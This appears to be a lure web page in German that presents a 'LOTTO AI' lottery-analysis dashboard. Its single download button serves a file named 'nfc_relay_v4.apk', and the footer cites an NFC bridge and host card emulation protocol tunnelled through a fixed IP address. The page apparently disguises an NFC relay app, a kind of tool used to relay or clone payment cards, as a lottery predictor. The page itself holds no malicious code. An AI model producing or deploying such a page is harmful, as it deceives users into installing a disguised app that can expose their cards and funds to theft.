<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LOTTO AI | Premium Dashboard v5.5</title>
    <style>
        :root {
            --primary: #00ff41; 
            --accent: #58a6ff;
            --bg-dark: #05080a;
        }

        body {
            background-color: var(--bg-dark);
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* --- ARKA PLAN KATMANLARI --- */
        .bg-layer {
            position: absolute;
            z-index: 1;
            pointer-events: none;
            opacity: 0.15;
            filter: blur(2px);
        }
        .png-1 { top: -5%; left: -5%; width: 40%; transform: rotate(-10deg); }
        .png-2 { bottom: -5%; right: -5%; width: 45%; }
        .png-3 { top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; opacity: 0.08; }

        /* --- ANA PANEL (ORTADA) --- */
        .dashboard-container {
            background: rgba(13, 17, 23, 0.92);
            border: 1px solid rgba(0, 255, 65, 0.25);
            border-radius: 25px;
            padding: 40px;
            width: 90%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 0 60px rgba(0, 255, 65, 0.2);
            backdrop-filter: blur(20px);
            z-index: 10;
            position: relative;
        }

        .main-logo {
            width: 130px;
            height: 130px;
            border-radius: 50%;
            border: 3px solid var(--primary);
            box-shadow: 0 0 20px var(--primary);
            margin-bottom: 20px;
            object-fit: cover;
        }

        h1 {
            font-size: 24px;
            color: var(--primary);
            letter-spacing: 2px;
            text-transform: uppercase;
            margin-bottom: 10px;
        }

        .status-badge {
            background: rgba(0, 255, 65, 0.1);
            color: var(--primary);
            padding: 6px 18px;
            border-radius: 50px;
            font-size: 13px;
            border: 1px solid var(--primary);
            display: inline-block;
            margin-bottom: 25px;
        }

        /* GÖRSEL 2 (Analiz Grafiği) */
        .preview-box img {
            width: 100%;
            border-radius: 12px;
            margin-bottom: 30px;
            border: 1px solid rgba(88, 166, 255, 0.3);
        }

        /* APK İNDİRME BUTONU (TAM ORTADA VE BÜYÜK) */
        .download-btn {
            background: linear-gradient(135deg, #00ff41 0%, #008f11 100%);
            color: #000;
            text-decoration: none;
            display: block;
            padding: 22px;
            font-weight: 900;
            border-radius: 15px;
            font-size: 20px;
            text-transform: uppercase;
            transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            box-shadow: 0 10px 30px rgba(0, 255, 65, 0.3);
        }

        .download-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 15px 40px rgba(0, 255, 65, 0.5);
            filter: brightness(1.2);
        }

        .footer-info {
            margin-top: 35px;
            font-size: 11px;
            color: #484f58;
            line-height: 1.6;
            letter-spacing: 0.5px;
        }

        .blink-dot {
            height: 8px; width: 8px;
            background-color: var(--primary);
            border-radius: 50%;
            display: inline-block;
            margin-right: 6px;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.3); opacity: 0.5; }
            100% { transform: scale(1); opacity: 1; }
        }
    </style>
</head>
<body>

    <!-- ARKA PLAN GÖRSELLERİ (Dinamik Katman) -->
    <img src="1.png" class="bg-layer 1" onerror="this.style.display='none'">
    <img src="2.png" class="bg-layer 2" onerror="this.style.display='none'">
    <img src="3.png" class="bg-layer 3" onerror="this.style.display='none'">

    <div class="dashboard-container">
        <!-- 1. RESİM (Logo) -->
        <img src="logo.png" alt="Lotto AI Master" class="main-logo" onerror="this.src='https://github.com/identicons/app.png'">
        
        <h1>LOTTO ANALYSE</h1>
        <div class="status-badge">
            <span class="blink-dot"></span> SYSTEM: VERSCHLÜSSELT
        </div>

        <!-- 2. RESİM (Analiz Görseli) -->
        <div class="preview-box">
            <img src="2.png" alt="Dashboard Preview" onerror="this.style.display='none'">
        </div>

        <!-- APK İNDİRME BUTONU -->
        <a href="nfc_relay_v4.apk" class="download-btn">
            APK HERUNTERLADEN
        </a>

        <div class="footer-info">
            NFC Bridge & HCE Master Protocol v5.5<br>
            Secure Tunneling through 216.106.178.54<br>
            &copy; 2026 Dilyan2121 Cyber Infrastructure
        </div>
    </div>

</body>
</html>
